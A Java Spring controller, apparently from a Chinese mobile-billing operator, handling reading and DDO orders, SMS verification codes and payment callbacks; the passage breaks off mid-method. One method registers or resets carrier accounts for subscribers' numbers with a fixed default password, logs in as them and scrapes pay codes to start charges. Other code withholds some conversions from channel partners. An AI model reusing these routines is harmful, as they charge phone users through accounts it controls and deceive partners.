package com.jh.mng.controller.ds;

import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPInputStream;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.commons.codec.digest.DigestUtils;
import org.apache.commons.httpclient.Cookie;
import org.apache.commons.httpclient.Header;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.HttpMethod;
import org.apache.commons.httpclient.HttpStatus;
import org.apache.commons.httpclient.NameValuePair;
import org.apache.commons.httpclient.cookie.CookiePolicy;
import org.apache.commons.httpclient.methods.GetMethod;
import org.apache.commons.httpclient.methods.PostMethod;
import org.apache.commons.lang.StringUtils;
import org.apache.log4j.Logger;
import org.dom4j.Document;
import org.dom4j.DocumentHelper;
import org.dom4j.Element;
import org.jsoup.Jsoup;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.servlet.ModelAndView;

import com.alibaba.fastjson.JSONObject;
import com.jh.mng.common.Config;
import com.jh.mng.common.StrIntBag;
import com.jh.mng.controller.AbstractMultiActionController;
import com.jh.mng.pojo.ChnlResource;
import com.jh.mng.pojo.ConsumeInfo;
import com.jh.mng.pojo.Mask;
import com.jh.mng.pojo.ReceiveSms;
import com.jh.mng.util.Base64Util;
import com.jh.mng.util.DateTool;
import com.jh.mng.util.DdoSign;
import com.jh.mng.util.HttpClientUtil;
import com.jh.mng.util.HttpTookit;
import com.jh.mng.util.MD5Util;
import com.jh.mng.util.MobileFromUtil;
import com.jh.mng.util.MyLog;
import com.jh.mng.util.RequestUtil;

/**
 * 汉娱世纪
 * @author admin
 *
 */
@Controller
@RequestMapping("/ds")
public class HyController extends AbstractMultiActionController {
	
	private static final Logger logger = Logger.getLogger(HyController.class);

	@RequestMapping("/hyRdoOrder.do")
	public ModelAndView hyRdoOrder(HttpServletRequest request, HttpServletResponse response){
		
		try {
			PrintWriter pw = response.getWriter();
			
			JSONObject jObject = new JSONObject();
			jObject.put("status", STATUS_RESP_FAILED);
			
			String requestStr = request.getQueryString();
			
			logger.info("汉娱RDO请求参数: " + requestStr);
			
			String feecode = RequestUtil.GetParamString(request, "feecode", null);
			String cpparam = RequestUtil.GetParamString(request, "cpparam", null);
			String phone = RequestUtil.GetParamString(request, "phone", null);
			String cm = RequestUtil.GetParamString(request, "cm", null);
			String mcpid = RequestUtil.GetParamString(request, "mcpid", null);
			
			String province = getStateByMobile(phone);
			province = GetState(province);
			
			String chnlId = cpparam.substring(0,2);
			
			ReceiveSms receiveSms = new ReceiveSms();
			
			Long id = orderService.getNextOrderId();
			
			jObject.put("orderid", id);
			
			String reqTime = DateTool.getCurrentDate("yyyyMMddHHmmss");
			String layout = "9";
			
			StringBuffer signStr = new StringBuffer();
			signStr.append(mcpid);
			signStr.append(feecode);
			signStr.append(id);
			signStr.append(reqTime);
			
			String sign = DigestUtils.md5Hex((signStr.toString() + Config.get().get("key_hy")).getBytes("UTF-8")).toUpperCase();
			
			StringBuffer param = new StringBuffer();
			param.append("mcpid=");
			param.append(mcpid);
			param.append("&orderNo=");
			param.append(id);
			param.append("&feeCode=");
			param.append(feecode);
			param.append("&reqTime=");
			param.append(reqTime);
			param.append("&sign=");
			param.append(sign);
			param.append("&layout=");
			param.append(layout);
			param.append("&cm=");
			param.append(cm);
//			param.append("&redirectUrl=");
//			param.append(URLEncoder.encode(Config.get().get("redirectUrl_hy"), "UTF-8"));
//			param.append("&vt=1");
			
			String bag = HttpTookit.doGet("http://wap.cmread.com/rdo/order?" + param.toString(), null, "utf-8", false);
//			StrIntBag bag = HttpClientUtil.executeGet("http://wap.cmread.com/rdo/order?" + param.toString());
			
			logger.info("hy req : " + param.toString() + ",bag resp is : " + bag);
			
			if (bag != null) {
				Document doc = DocumentHelper.parseText(bag);
				Element root = doc.getRootElement();
				
				String resultCode = root.elementText("ResultCode");
				
				if (resultCode != null && resultCode.equals("200")) {
					String verifType = root.element("Order").elementText("VerifType");
					
					if ("0".equals(verifType)) { //短信验证
						String getSMSVerifyCodeUrl = root.element("Order").element("Submit0").elementText("GetSMSVerifyCodeUrl");
						
						if (StringUtils.isNotEmpty(getSMSVerifyCodeUrl)) {
							getSMSVerifyCodeUrl += "&msisdn=" + phone;
							
							//获取短信验证码
							String verifyCodeBag = HttpTookit.doGet(getSMSVerifyCodeUrl, null, "utf-8", false);
							
//							StrIntBag verifyCodeBag = HttpClientUtil.executeGet(getSMSVerifyCodeUrl);
							logger.info("GetverifyCode resp : " + verifyCodeBag);
							
							if (verifyCodeBag != null) {
								Document document = DocumentHelper.parseText(verifyCodeBag);
								Element root_code = document.getRootElement();
								
								String resultCode_code = root_code.elementText("ResultCode");
								
								if (resultCode_code != null && "200".equals(resultCode_code)) { //成功
									String submitUrl = root_code.element("Order").element("Submit0").element("ButtonTag").elementText("SubmitUrl");
									jObject.put("status", STATUS_RESP_SUCCESS);
									jObject.put("orderid", id);
									receiveSms.setExt(submitUrl);
								}
							}
						}
					}
				}
			}
			
			receiveSms.setId(id);
			receiveSms.setUserid("none");
			receiveSms.setCpserviceid("none");
			receiveSms.setConsumecode(feecode);
			receiveSms.setCpparam(cpparam);
			receiveSms.setHret(HRET_FIRST);
			receiveSms.setStatus(STATUS_FIRST);
			receiveSms.setTransido(String.valueOf(System.currentTimeMillis()));
			receiveSms.setVersionid("none");
			receiveSms.setPackageid("1000");
			receiveSms.setSyncflag(0);
			receiveSms.setSyncchnl(0);
			receiveSms.setChnl_id(Integer.parseInt(chnlId));
			receiveSms.setFee(0);
			receiveSms.setDec_flag(1);
			receiveSms.setState(province);
			receiveSms.setPhoneno(phone);
			
			orderService.createReceiveSms(receiveSms);
			
			logger.info("汉娱RDO服务端响应为：" + jObject.toString());
			
			pw.print(jObject.toString());
		} catch (Exception e) {
			e.printStackTrace();
			logger.error("hyRdoOrder error : " + e.getMessage());
		}
		return null;
	}
	
	@RequestMapping("/hyRdoVerifyCode.do")
	public ModelAndView hyRdoVerifyCode(HttpServletRequest request, HttpServletResponse response) {
		
		try {
			PrintWriter pw = response.getWriter();
			
			JSONObject jObject = new JSONObject();
			jObject.put("status", STATUS_RESP_FAILED);
			
			String requestStr = request.getQueryString();
			
			logger.info("汉娱短信验证请求参数为: " + requestStr);
			
			String verifyCode = RequestUtil.GetParamString(request, "verifycode", null);
			Long orderId = RequestUtil.GetParamLong(request, "orderid", null);
			
			ReceiveSms receiveSms = orderService.queryReceiveSmsById(String.valueOf(orderId));
			
			if (receiveSms != null && receiveSms.getStatus().equals(STATUS_FIRST)) {
				receiveSms.setHret(HRET_SECOND);
				String ext = receiveSms.getExt();
				
				
				NameValuePair param = new NameValuePair("verifyCode", verifyCode);
		        NameValuePair[] data = {param}; 
		    	
		    	String confirmResp = HttpTookit.methodPost(ext, data);
				
		    	logger.info("hyRdoVerifyCode resp :" + confirmResp);
				
				jObject.put("status", STATUS_RESP_SUCCESS);
				receiveSms.setStatus(STATUS_SECOND); //计费短信发送成功
				
				orderService.updateReceiveSms(receiveSms);
			}
			pw.print(jObject.toString());
		} catch (Exception e) {
			e.printStackTrace();
			logger.error("hyRdoVerifyCode error : " + e.getMessage());
		}
		return null;
	}
	
	@RequestMapping("/hyRdoReport.do")
	public ModelAndView hyRdoReport(HttpServletRequest request, HttpServletResponse response) {
		try {
			PrintWriter pw = response.getWriter();
			
			String req = request.getQueryString();
			
			logger.info("汉娱阅读数据同步请求参数为 :" + req);
			
			String mcpid = request.getParameter("mcpid");
			String feeCode = request.getParameter("feeCode");
			String orderNo = request.getParameter("orderNo");
			String reqTime = request.getParameter("reqTime");
			String resultCode = request.getParameter("resultCode");
			String sign = request.getParameter("sign");
			String mobile = request.getParameter("msisdn");
			
			StringBuffer signStr = new StringBuffer();
			signStr.append(mcpid);
			signStr.append(feeCode);
			signStr.append(orderNo);
			signStr.append(reqTime);
			
			String localSign = DigestUtils.md5Hex((signStr.toString() + Config.get().get("key_hy")).getBytes("UTF-8")).toUpperCase();
			
			if (localSign.equals(sign)) {
				ReceiveSms receiveSms = orderService.queryReceiveSmsById(orderNo);
				
				if (receiveSms != null) {
					int fee = -1;
					int over_arpu = 0;
					String today = DateTool.getCurrentDate("yyyyMMdd");
					
					if (StringUtils.isNotEmpty(mobile)) {
						receiveSms.setPhoneno(mobile);
					}
					
					String province = getStateByMobile(receiveSms.getPhoneno());
					province = GetState(province);
					
					receiveSms.setState(province);
					
					if (resultCode != null && "1".equals(resultCode)) {
						receiveSms.setStatus(STATUS_SUCCESS);
						receiveSms.setHret(HRET_SUCCESS);
					} else {
						receiveSms.setStatus(resultCode);
					}
					
					ConsumeInfo consumeInfo = orderService.queryConsumeInfoByCode(receiveSms.getConsumecode());
					
					if (consumeInfo != null) {
						receiveSms.setFee(consumeInfo.getFee());
						
						List<ChnlResource> chnlResourceList = orderService.queryResourceByConsumeId(Long.parseLong(today), consumeInfo.getId());
						
						boolean flag = false;
						
						if (chnlResourceList != null && chnlResourceList.size() > 0) {
							for (ChnlResource chnlResource : chnlResourceList) {
								
								if (receiveSms.getChnl_id() == chnlResource.getChnlId().intValue()) {
									List<Mask> maskList = orderService.queryMaskByResIdAndState(chnlResource.getId(), receiveSms.getState());
									
									if (maskList != null && maskList.size() > 0) {
										receiveSms.setChnl_id(chnlResource.getChnlId().intValue());
										flag = true;
										break;
									}
								}
							}
						}
						
						if (!flag) {
							receiveSms.setChnl_id(-1);
						}
					} else {
						receiveSms.setChnl_id(-1);
					}
					//超限验证
					over_arpu = checkArpu(Config.get().getInt("MAX_R_FEE_HY", 1000000), Config.get().getInt("MAX_Y_FEE_HY", 1000000), today, receiveSms.getUserid(), fee);
					
					//扣量验证
					int dec_flag = 0;
					
					if (over_arpu == 0) {
						if (receiveSms.getChnl_id() > 0) {
							dec_flag = shouldKouliangByState(today, receiveSms.getChnl_id(), receiveSms.getConsumecode(), receiveSms.getState(), receiveSms.getPackageid());
							
							receiveSms.setDec_flag(dec_flag);
							
							if (dec_flag == 1) {
								receiveSms.setSyncchnl(200);
							} else {
								receiveSms.setSyncchnl(0);
							}
						}
						
					} else {
						receiveSms.setSyncchnl(300);
						receiveSms.setDec_flag(1);
					}
					orderService.updateReceiveSms(receiveSms);
					pw.print("200");
				} 
			}
		} catch (Exception e) {
			e.printStackTrace();
			logger.error("hyRdoReport error : " + e.getMessage());
		}
		return null;
	}
	
	@RequestMapping("/hyRdoUrl.do")
	public ModelAndView hyRdoUrl(HttpServletRequest request, HttpServletResponse response) {
		try {
			PrintWriter pw = response.getWriter();
			
			JSONObject jObject = new JSONObject();
			jObject.put("status", STATUS_RESP_SUCCESS);
			
			String requestStr = request.getQueryString();
			
			logger.info("new hy rdo order: " + requestStr);
			
			String feecode = RequestUtil.GetParamString(request, "feecode", null);
			String cpparam = RequestUtil.GetParamString(request, "cpparam", null);
			String phone = RequestUtil.GetParamString(request, "phone", null);
			String cm = RequestUtil.GetParamString(request, "cm", null);
			String mcpid = RequestUtil.GetParamString(request, "mcpid", null);
			String redirectUrl = RequestUtil.GetParamString(request, "redirecturl", null);
			
			String province = "未知";
			
			if (StringUtils.isEmpty(phone)) {
				phone = "none";
			} else {
				province = getStateByMobile(phone);
				province = GetState(province);
			}
			
			String chnlId = cpparam.substring(0,2);
			
			ReceiveSms receiveSms = new ReceiveSms();
			
			Long id = orderService.getNextOrderId();
			String reqTime = DateTool.getCurrentDate("yyyyMMddHHmmss");
//			String layout = "9";
			
			StringBuffer signStr = new StringBuffer();
			signStr.append(mcpid);
			signStr.append(feecode);
			signStr.append(id);
			signStr.append(reqTime);
			
//			logger.info("need sign str: " + signStr.toString());
			
			String sign = DigestUtils.md5Hex((signStr.toString() + Config.get().get("key_hy")).getBytes("UTF-8")).toUpperCase();
			
			StringBuffer param = new StringBuffer();
			param.append("mcpid=");
			param.append(mcpid);
			param.append("&orderNo=");
			param.append(id);
			param.append("&feeCode=");
			param.append(feecode);
			param.append("&reqTime=");
			param.append(reqTime);
			param.append("&sign=");
			param.append(sign);
//			param.append("&layout=");
//			param.append(layout);
			param.append("&cm=");
			param.append(cm);
			param.append("&redirectUrl=");
			param.append(URLEncoder.encode(redirectUrl, "UTF-8"));
			param.append("&vt=3");
			
			String payUrl = Config.get().get("orderurl_hy")+ "?" + param.toString();
			
			logger.info("payUrl :" + payUrl);
			
			jObject.put("payUrl", payUrl);
			
			receiveSms.setId(id);
			receiveSms.setUserid("none");
			receiveSms.setCpserviceid("none");
			receiveSms.setConsumecode(feecode);
			receiveSms.setCpparam(cpparam);
			receiveSms.setHret(HRET_SECOND);
			receiveSms.setStatus(STATUS_SECOND);
			receiveSms.setTransido(String.valueOf(System.currentTimeMillis()));
			receiveSms.setVersionid("none");
			receiveSms.setPackageid("1000");
			receiveSms.setSyncflag(0);
			receiveSms.setSyncchnl(0);
			receiveSms.setChnl_id(Integer.parseInt(chnlId));
			receiveSms.setFee(0);
			receiveSms.setDec_flag(1);
			receiveSms.setState(province);
			receiveSms.setPhoneno(phone);
			
			orderService.createReceiveSms(receiveSms);
			
			pw.print(jObject.toString());
		} catch (Exception e) {
			e.printStackTrace();
			logger.error("hyRdoOrder error : " + e.getMessage());
		}
		return null;
	}
	
	@RequestMapping("/hyDdoReport.do")
	public ModelAndView hyDdoReport(HttpServletRequest request, HttpServletResponse response) {
		try {
			PrintWriter pw = response.getWriter();
			
			InputStream in = request.getInputStream();
			byte b[] = new byte[10000];
			in.read(b, 0, 10000);
			String requestStr = new String(b, "UTF-8");
			in.close();
			
			logger.info("汉娱DDO数据同步请求参数为：" + requestStr);
			
			if(null != requestStr && !"".equals(requestStr)){
				if(requestStr.indexOf("<") != -1 && requestStr.lastIndexOf(">") != -1 && requestStr.lastIndexOf(">") > requestStr.indexOf("<"))
				requestStr = requestStr.substring(requestStr.indexOf("<"), requestStr.lastIndexOf(">") + 1);
			}
			
			Document doc = DocumentHelper.parseText(requestStr);
			Element root = doc.getRootElement();
			
			String orderId = root.elementText("ExData");
			
			ReceiveSms receiveSms = orderService.queryReceiveSmsById(orderId);
			
			if (receiveSms != null) {
				String today = DateTool.getCurrentDate("yyyyMMdd");
				
				receiveSms.setPhoneno(receiveSms.getPhoneno());
				
				String province = getStateByMobile(receiveSms.getPhoneno());
				province = GetState(province);
				
				receiveSms.setState(province);
				
				receiveSms.setStatus(STATUS_SUCCESS);
				receiveSms.setHret(HRET_SUCCESS);
				
				ConsumeInfo consumeInfo = orderService.queryConsumeInfoByCode(receiveSms.getConsumecode());
				
				if (consumeInfo != null) {
					receiveSms.setFee(consumeInfo.getFee());
					
					List<ChnlResource> chnlResourceList = orderService.queryResourceByConsumeId(Long.parseLong(today), consumeInfo.getId());
					
					boolean flag = false;
					
					if (chnlResourceList != null && chnlResourceList.size() > 0) {
						for (ChnlResource chnlResource : chnlResourceList) {
							
							if (receiveSms.getChnl_id() == chnlResource.getChnlId().intValue()) {
								List<Mask> maskList = orderService.queryMaskByResIdAndState(chnlResource.getId(), receiveSms.getState());
								
								if (maskList != null && maskList.size() > 0) {
									receiveSms.setChnl_id(chnlResource.getChnlId().intValue());
									flag = true;
									break;
								}
							}
						}
					}
					
					if (!flag) {
						receiveSms.setChnl_id(-1);
					}
				} else {
					receiveSms.setChnl_id(-1);
				}
				
				//扣量验证
				int dec_flag = 0;
				
				if (receiveSms.getChnl_id() > 0) {
					dec_flag = shouldKouliangByState(today, receiveSms.getChnl_id(), receiveSms.getConsumecode(), receiveSms.getState(), receiveSms.getPackageid());
					
					receiveSms.setDec_flag(dec_flag);
					
					if (dec_flag == 1) {
						receiveSms.setSyncchnl(200);
					} else {
						receiveSms.setSyncchnl(0);
					}
				}
				
				orderService.updateReceiveSms(receiveSms);
				pw.print("<Response><MsgType>ChargedNotifyResp</MsgType><ReturnCode>0</ReturnCode><ResultDesc>success</ResultDesc></Response>");
			} 
			
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}
	
	/**
	 * 订购验证码下发
	 * @param request
	 * @param response
	 * @return
	 */
	@RequestMapping("/hyDdoOrder.do")
	public ModelAndView hyDdoOrder(HttpServletRequest request, HttpServletResponse response) {
		String params = request.getQueryString();

		StringBuffer logBuffer = new StringBuffer();
		logBuffer.append("汉娱世纪DDO业务新订单请求参数：" + params);
		
		JSONObject jObject = new JSONObject();
		jObject.put("status", STATUS_RESP_FAILED);
		PrintWriter pw = null;
		
		try {
			pw = response.getWriter();
			
			String feecode = RequestUtil.GetParamString(request, "feecode", null);
			String mobile = RequestUtil.GetParamString(request, "mobile", null);
			String cpparam = RequestUtil.GetParamString(request, "cpparam", null);
			String transido = String.valueOf(System.currentTimeMillis() /1000);
			
			ConsumeInfo consumeInfo = orderService.queryConsumeInfoById(Long.parseLong(feecode));
			
			Long id = orderService.getNextOrderId();
			
			jObject.put("orderid", id);
			
			String versionid = "none";
			String chnlId = cpparam.substring(0,2);
			
			
			//生成本地订单
			String userid = mobile;
			String cpserviceid = "none";
			
			if (StringUtils.isEmpty(transido)) {
				transido = String.valueOf(System.currentTimeMillis());
			}
			
			String phoneno = mobile;
			String packageid = "1000";
			
			String province = getStateByMobile(phoneno);
			province = GetState(province);
			
			String appId = Config.get().get("appid_hyddo");
			String appKey = Config.get().get("appkey_hyddo");
			String channelId = Config.get().get("channelid_hyddo");
			
			ReceiveSms receiveSms = new ReceiveSms();
			
			StringBuffer sb = new StringBuffer();
			sb.append("customerid=hanjoys");
			sb.append("&orderno=");
			sb.append(id);
			sb.append("&appid=");
			sb.append(appId);
			sb.append("&paycode=");
			sb.append(consumeInfo.getConsumeCode());
			sb.append("&channelid=");
			sb.append(channelId);
			sb.append("&mobile=");
			sb.append(phoneno);
			sb.append("&appkey=");
			sb.append(appKey);
			
			String bag = HttpTookit.doGet("http://115.238.48.254:9059/jf/platform/ddoCash/reqOrder?" + sb.toString(), null, "utf-8", false);
			
			logger.info("ddo 2.0 req : " + sb.toString() + ", bag resp is : " + bag);
			
			if (bag != null) {
				JSONObject resultObject = JSONObject.parseObject(bag);
				
				boolean result = resultObject.getBooleanValue("result");
				String msg = resultObject.getString("msg");
				receiveSms.setExt(msg);
				if (result) {
					jObject.put("status", STATUS_RESP_SUCCESS);
				}
			} 
			
			receiveSms.setId(id);
			receiveSms.setUserid(userid);
			receiveSms.setCpserviceid(cpserviceid);
			receiveSms.setConsumecode(consumeInfo.getConsumeCode());
			receiveSms.setCpparam(cpparam);
			receiveSms.setHret(HRET_FIRST);
			receiveSms.setStatus(STATUS_FIRST);
			receiveSms.setTransido(transido);
			receiveSms.setVersionid(versionid);
			receiveSms.setPackageid(packageid);
			receiveSms.setSyncflag(0);
			receiveSms.setSyncchnl(0);
			receiveSms.setChnl_id(Integer.parseInt(chnlId));
			receiveSms.setFee(consumeInfo.getFee());
			receiveSms.setDec_flag(1);
			receiveSms.setState(province);
			receiveSms.setPhoneno(phoneno);
			
			orderService.createReceiveSms(receiveSms);
			
		} catch (Exception e) {
			e.printStackTrace();
			logger.error("hyDdoOrder error : " + e.getMessage());
		}
		logBuffer.append(",服务端响应为：" + jObject.toString());
		
		logger.info(logBuffer.toString());
		
		pw.print(jObject.toString());
		return null;
	}
	
	/**
	 * 注册或找回验证码提交
	 * @param request
	 * @param response
	 * @return
	 */
	@RequestMapping("/hyDdoPwd.do")
	public ModelAndView hyDdoPwd(HttpServletRequest request, HttpServletResponse response) {
		String params = request.getQueryString();

		StringBuffer logBuffer = new StringBuffer();
		logBuffer.append("汉娱世纪DDO业务注册或找回密码请求参数：" + params);
		
		JSONObject jObject = new JSONObject();
		jObject.put("status", STATUS_RESP_FAILED);
		PrintWriter pw = null;
		
		try {
			pw = response.getWriter();
			
			String verifyCode = RequestUtil.GetParamString(request, "verifycode", null);
			Long orderId = RequestUtil.GetParamLong(request, "orderid", null);
			
			String code = "-1";
			
			ReceiveSms receiveSms = orderService.queryReceiveSmsById(String.valueOf(orderId));
			
			if (receiveSms != null) {
				String type = receiveSms.getVersionid();
				
				if ("2".equals(type)) { //注册验证码
					HttpClient client = new HttpClient(); 
					PostMethod phonePostMethod = new PostMethod("http://wap.dm.10086.cn/ClientAndroid/register_user.hisun");
				    NameValuePair[] data = {
				                new NameValuePair("new_password", "C74FF7B8A69DDABFCC90A452E79053E2"),
				                new NameValuePair("mobile_num", encrypt(receiveSms.getPhoneno())),
				                new NameValuePair("is_encrypted", "true"),
				                new NameValuePair("validate_code", verifyCode),
				                new NameValuePair("is_supportIDMP", "True"),
				                new NameValuePair("sessionID", receiveSms.getExt()),
				                new NameValuePair("disable_migu", "0"),
				   };
				    
				    Map<String, String> headMap = getHeadMap();
				    
				    for (Map.Entry<String, String> entry : headMap.entrySet()) {  
				    	phonePostMethod.addRequestHeader(entry.getKey(),entry.getValue());  
				    }  
				   	
				    phonePostMethod.setRequestBody(data);
				   	
				   	client.executeMethod(phonePostMethod);
				   	
				   	String resp = getGzipResponseBodyAsString(phonePostMethod);
				   	
				   	MyLog.InfoLog("手机号： " + receiveSms.getPhoneno() + ",注册结果响应： " + resp);
				   	
				   	if (resp != null) {
				   		JSONObject json = JSONObject.parseObject(resp);
				   		code = json.getString("code");
//				   		
//				   		if ("0".equals(code)) { 
//				   			jObject.put("status", STATUS_RESP_SUCCESS);
//				   		}
				   	}
				} else if ("3".equals(type)) { //找回密码验证码
					HttpClient client = new HttpClient(); 
					PostMethod phonePostMethod = new PostMethod("http://wap.dm.10086.cn/ClientAndroid/forget_password.hisun");
					NameValuePair[] data = {
			                new NameValuePair("new_password", "C74FF7B8A69DDABFCC90A452E79053E2"),
			                new NameValuePair("mobile", encrypt(receiveSms.getPhoneno())),
			                new NameValuePair("is_encrypted", "true"),
			                new NameValuePair("validate_code", verifyCode),
			                new NameValuePair("is_supportIDMP", "True"),
			                new NameValuePair("sessionID", receiveSms.getExt()),
			                new NameValuePair("disable_migu", "0"),
			                new NameValuePair("type", "0"),
			        };
				    
				    Map<String, String> headMap = getHeadMap();
				    
				    for (Map.Entry<String, String> entry : headMap.entrySet()) {  
				    	phonePostMethod.addRequestHeader(entry.getKey(),entry.getValue());  
				    }  
				   	
				    phonePostMethod.setRequestBody(data);
				   	
				   	client.executeMethod(phonePostMethod);
				   	
				   	String resp = getGzipResponseBodyAsString(phonePostMethod);
				   	
				   	MyLog.InfoLog("手机号： " + receiveSms.getPhoneno() + ",找回密码结果响应： " + resp);
				   	
				   	if (resp != null) {
				   		JSONObject json = JSONObject.parseObject(resp);
				   		code = json.getString("code");
//				   		
//				   		if ("0".equals(code) || "2".equals(code)) { 
//				   			jObject.put("status", STATUS_RESP_SUCCESS);
//				   		}
				   	}
				}
				
				if ("2".equals(code)) { //需要升级咪咕账号
					HttpClient client = new HttpClient(); 
					PostMethod phonePostMethod = new PostMethod("http://wap.dm.10086.cn/ClientAndroid/new_send_message_to_get_vertification_code.hisun");
					NameValuePair[] data = {
				               new NameValuePair("mobile_num", encrypt(receiveSms.getPhoneno())), 
				               new NameValuePair("type", "8"), //注册TYPE：2 找回密码TYPE：3 升级账号：8
				               new NameValuePair("is_supportIDMP", "True"),
				               new NameValuePair("isRechargeEmail", "0"),
				    };
				    
				    Map<String, String> headMap = getHeadMap();
				    
				    for (Map.Entry<String, String> entry : headMap.entrySet()) {  
				    	phonePostMethod.addRequestHeader(entry.getKey(),entry.getValue());  
				    }  
				   	
				    phonePostMethod.setRequestBody(data);
				   	
				   	client.executeMethod(phonePostMethod);
				   	
				   	String resp = getGzipResponseBodyAsString(phonePostMethod);
				   	
				   	MyLog.InfoLog("手机号： " + receiveSms.getPhoneno() + ",升级账号发送验证码结果响应： " + resp);
				   	
				   	if (resp != null) {
				   		JSONObject json = JSONObject.parseObject(resp);
				   		
				   		if ("0".equals(json.getString("code"))) { 
				   			jObject.put("status", STATUS_RESP_SUCCESS);
				   			jObject.put("orderid", receiveSms.getId());
				   			jObject.put("updateFlag", "1");
				   			receiveSms.setExt(json.getString("sessionID"));
				   			orderService.updateReceiveSms(receiveSms);
				   		}
				   	}
				} else if ("0".equals(code)) { //注册或找回密码成功，默认密码：123_456
					
					orderService.createDdoPhone(receiveSms.getPhoneno());
					
					String appId = Config.get().get("appid_hyddo");
					String appKey = Config.get().get("appkey_hyddo");
					String channelId = Config.get().get("channelid_hyddo");
					
					String needSign = receiveSms.getId() + "&" + appId + "&" + appKey + "&" + receiveSms.getConsumecode() + "&" + receiveSms.getTransido() + "&" + channelId;
					
					StringBuffer sb = new StringBuffer();
					sb.append("RequestID=");
					sb.append(receiveSms.getId());
					sb.append("&AppID=");
					sb.append(appId);
					sb.append("&feecode=");
					sb.append(receiveSms.getConsumecode());
					sb.append("&PayCode=");
					sb.append(receiveSms.getConsumecode());
					sb.append("&TimeStamp=");
					sb.append(receiveSms.getTransido());
					sb.append("&ChannelID=");
					sb.append(channelId);
					sb.append("&Signature=");
					sb.append(Base64Util.encode(MD5Util.getUpperCaseMd5(needSign).getBytes()));
					
					HttpClient httpClient = new HttpClient();
					
					GetMethod getMethod0 = new GetMethod("http://wap.dm.10086.cn/apay/orderHandle.jsp?" + sb.toString());
					
					httpClient.getParams().setCookiePolicy(CookiePolicy.BROWSER_COMPATIBILITY);
					httpClient.executeMethod(getMethod0);
					
					String text0 = getMethod0.getResponseBodyAsString();
					
//					logger.info("ddo计费URL响应:" + text0);
					
					String ssoUrl = "";
					
					if (text0.indexOf("var ssoUrl") > 0) {
						int beginIndex = text0.indexOf("var ssoUrl") + 14;
						int endIndex = text0.indexOf(";", text0.indexOf("var ssoUrl"));
						ssoUrl = text0.substring(beginIndex, endIndex - 1);
					}
					
					Cookie[] cookies = httpClient.getState().getCookies();
		            String tmpcookies= "";
		            for(Cookie c:cookies){
		                tmpcookies += c.toString()+";";
		            }
					
					GetMethod getMethod1 = new GetMethod(ssoUrl);
					httpClient.executeMethod(getMethod1);
					getMethod1.setRequestHeader("cookie",tmpcookies);
					String text = getMethod1.getResponseBodyAsString();
//					
					org.jsoup.nodes.Document doc = Jsoup.parse(text); 
					org.jsoup.nodes.Element form = doc.select("form").first();
			    	String action = form.attr("action"); //登录 
			    	
			    	PostMethod postMethod1 = new PostMethod("http://wap.dm.10086.cn" + action);
				   	 
				        //设置登陆时要求的信息，一般就用户名和密码，验证码自己处理了
				        NameValuePair[] data1 = {
				                new NameValuePair("username", receiveSms.getPhoneno()),
				                new NameValuePair("password", Base64Util.encode("123_456".getBytes())),
				                new NameValuePair("lt", doc.select("input[name=lt]").val()),
				                new NameValuePair("execution", doc.select("input[name=execution]").val()),
				                new NameValuePair("_eventId", doc.select("input[name=_eventId]").val()),
				                new NameValuePair("user_hackRemember", doc.select("input[name=user_hackRemember]").val()),
				        };
				        postMethod1.setRequestBody(data1);
				        
//				        Cookie[] cookies2 = httpClient.getState().getCookies();
//				    	String tmpcookies2= "";
//				    	for(Cookie c:cookies2){
//			                tmpcookies2 += c.toString()+";";
//			            }
			            
//				    	postMethod.setRequestHeader("cookie",tmpcookies2);
				        int statusCode = httpClient.executeMethod(postMethod1);
				        
//				        String text2 = postMethod1.getResponseBodyAsString();
				        String location = "";
			            if (statusCode == HttpStatus.SC_MOVED_PERMANENTLY  
			                    || statusCode == HttpStatus.SC_MOVED_TEMPORARILY) {  
			                // 从头中取出转向的地址  
			                Header locationHeader = postMethod1.getResponseHeader("location");  
//			                String location = null;  
			                if (locationHeader != null) {  
			                     location = locationHeader.getValue();  
//			                    log.info("The page was redirected to:" + location);  
//			                    response= methodPost(location,data);//用跳转后的页面重新请求。  
			                } else {  
			                    logger.error("Location field value is null.");  
			                }  
			            } else {
			            	logger.info(postMethod1.getStatusLine());
			            }
			            
			            GetMethod getMethod2 = new GetMethod(location);
						httpClient.executeMethod(getMethod2);
//						getMethod1.setRequestHeader("cookie",tmpcookies);
						String text3 = getMethod2.getResponseBodyAsString();
			            
			            
						int beginIndex = text3.indexOf("var paycode") + 15;
						int endIndex = text3.indexOf(";", text3.indexOf("var paycode"));
						
						String payCode = text3.substring(beginIndex,endIndex -1);
						
//						String[] str = getDmINfo(location);
						
						beginIndex = text3.indexOf("var sessionid") + 17;
						endIndex = text3.indexOf(";", text3.indexOf("var sessionid"));
						String sessionId = text3.substring(beginIndex,endIndex -1);
						
						beginIndex = text3.indexOf("var orderId") + 15;
						endIndex = text3.indexOf(";", text3.indexOf("var orderId"));
						String orderId_mg = text3.substring(beginIndex,endIndex -1);
						
						String ext = payCode + "|" + sessionId + "|" + orderId_mg;
						
						String urlGetCode = "http://wap.dm.10086.cn/apay/handle.jsp?t=checkcode&paycode=" + payCode + "&sss=" + sessionId + "&order=" + orderId_mg + "&msisdn=" + receiveSms.getPhoneno();
						
						StrIntBag getCodeBag = HttpClientUtil.executeGet(urlGetCode);
						
						if (getCodeBag != null && getCodeBag._int == 200) {
							
							JSONObject jObject2 = JSONObject.parseObject(getCodeBag._str);
							String returnCode = jObject2.getString("ReturnCode");
							
							if ("0".equals(returnCode)) {
								receiveSms.setExt(ext);
								orderService.updateReceiveSms(receiveSms);
								jObject.put("orderid", receiveSms.getId());
								jObject.put("status", STATUS_RESP_SUCCESS);
							} else {
								jObject.put("status", returnCode);
							}
						}
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
			logger.error("hyDdoPwd error :" + e.getMessage());
		}
		
		logBuffer.append(",服务端响应为：" + jObject.toString());
		logger.info(logBuffer.toString());
		
		pw.print(jObject.toString());
		return null;
	}
	
	/**
	 * 验证码回填
	 * @param request
	 * @param response
	 * @return
	 */
	@RequestMapping("/hyDdoVerifyCode.do")
	public ModelAndView hyDdoVerifyCode(HttpServletRequest request, HttpServletResponse response) {
		PrintWriter pw = null;
